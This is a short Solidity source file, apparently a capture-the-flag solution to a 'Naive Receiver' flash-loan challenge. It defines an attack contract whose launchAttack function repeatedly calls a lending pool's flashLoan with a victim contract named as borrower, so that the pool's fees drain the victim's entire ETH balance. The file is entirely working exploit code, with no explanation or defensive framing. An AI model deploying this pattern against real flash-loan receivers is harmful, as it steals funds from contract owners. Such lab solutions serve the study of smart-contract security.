// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

interface INaiveReceiverLenderPool {
    function flashLoan(IERC3156FlashBorrower receiver, address token, uint256 amount, bytes calldata data)
        external
        returns (bool);
    function flashFee(address token, uint256) external returns (uint256);
}

contract NaiveReceiverAttack {
    address private constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;
    address private immutable pool;
    address private immutable victime;

    constructor(address _pool, address _victime) {
        pool = _pool;
        victime = _victime;
    }

    function launchAttack() external {
        uint256 nbrLoops = victime.balance / INaiveReceiverLenderPool(pool).flashFee(ETH, 0);
        for (uint256 i = 0; i < nbrLoops; ++i) {
            INaiveReceiverLenderPool(pool).flashLoan(IERC3156FlashBorrower(victime), ETH, 0, "0x");
        }
    }
}
